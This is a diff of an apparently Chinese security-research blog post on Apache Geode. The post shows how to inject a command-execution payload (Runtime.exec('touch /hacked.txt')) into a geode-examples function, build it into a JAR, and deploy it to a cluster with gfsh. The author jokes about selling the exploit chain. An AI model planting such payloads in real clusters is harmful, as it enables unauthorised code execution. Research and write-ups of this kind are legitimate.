@@ -449,7 +449,8 @@ public class TestFunction implements Function {
 ```
 `*Function接口的一个实现`
 
-这里笔者想提醒一下各位读者，请千万不要自己构造 JAR 包，若执意自己构造你会发现自己打包的 JAR 包由于各种原因根本无法兼容集群.  
+这里笔者想提醒一下各位读者，请千万不要自己构造 JAR 包，若执意自己构造你会发现自己打包的 JAR 包由于各种原因根本无法兼容集群.
+
 为了避免部署麻烦直接使用官方 Geode example 来改就行. 接下来笔者也将会用 Geode-example 来为各位读者展示 JAR 包构造流程及 Payload 注入. 首先输入以下命令从 Github 克隆 Geode-example 到本地
 
 ```bash
@@ -468,29 +469,34 @@ git clone https://github.com/apache/geode-examples
 1. 首先打开 PrimeNumber.java，在 execute 函数的 58 行添加我们的恶意测试 Payload，该 Payload 会在根目录创建个名称为 hacked.txt 的文件以验证命令执行漏洞  
 
     未植入前
-    ```java
-    public void execute(FunctionContext context) {
-        ...[省略代码]...
-        Collections.sort(primes);
 
-        context.getResultSender().lastResult(primes);
+    ```java
+    public class PrimeNumber implements Function {
+        public void execute(FunctionContext context) {
+            ...[省略代码]...
+            Collections.sort(primes);
+
+            context.getResultSender().lastResult(primes);
+        }
     }
     ```
 
     植入后
 
     ```java
-    public void execute(FunctionContext context) {
-        ...[省略代码]...
-        Collections.sort(primes);
+    public class PrimeNumber implements Function {
+        public void execute(FunctionContext context) {
+            ...[省略代码]...
+            Collections.sort(primes);
+            //笔者恶意代码
+            try {
+                Runtime.getRuntime().exec("touch /hacked.txt");
+            } catch (Exception e) {
+                throw new RuntimeException(e);
+            }
 
-        try {
-            Runtime.getRuntime().exec("touch /hacked.txt");
-        } catch (Exception e) {
-            throw new RuntimeException(e);
+            context.getResultSender().lastResult(primes);
         }
-
-        context.getResultSender().lastResult(primes);
     }
     ```
 
@@ -552,17 +558,15 @@ git clone https://github.com/apache/geode-examples
 
     ![avatar](/image/2024-06-01-7.png)  
 
-    连接完毕后，输入以下命令创建 region 并植入 JAR
+    连接完毕后，依次输入以下命令创建 region 并植入 JAR
 
     `create region --name=example-region --type=REPLICATE`  
     `describe region --name=example-region`  
     `deploy --jar={存放路径}/functions.jar`  
 
-    在客户端上输入以上命令时，请完全忽略回显，由于一些集群底层架构问题，回显是错误的. 
+    在客户端上输入以上命令时，请完全忽略回显，由于一些集群底层架构问题，回显是错误的，一切以集群实际情况为准.  
 
-    Tip1:   
-    第 1、2 条命令的作用是创建一个可交互性 region，笔者打包的 functions.jar 需要名为 example-region 的 region 用作数据交互  
-    第 3 条命令的作用是将 functions.jar 部署到集群中
+    Tip: 第 1、2 条命令的作用是创建一个可交互性 region，笔者打包的 functions.jar 需要名为 example-region 的 region 用作数据交互，第 3 条命令的作用是将 functions.jar 部署到集群中
 
 2. 进入 `geode-examples/functions`，输入以下命令启动客户端调用远程函数  
 
@@ -591,7 +595,7 @@ git clone https://github.com/apache/geode-examples
 1. Apache Geode 部署流程较为棘手，搞坏了我两台服务器真机(不包括 docker)的配置环境
 2. 笔者学业繁忙，如果想要达到 100% 复现率，需要花半把个月时间将整个 Geode 协议吃透，而本篇文章仅为学习用途，因此无任何深入研究  Geode 协议并将其利益化的必要
 
-如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi).  
+如果有人利用笔者的思路/漏洞链继续审出来RCE也没关系，这篇文章提到的漏洞链都是完全开放的，把洞卖了能分点钱给我就行(bushi)  
 
 总之如果有想部署复现、学习的读者可以联系笔者参考，有想拿去交 CVE 的就交吧就当笔者送你的
 
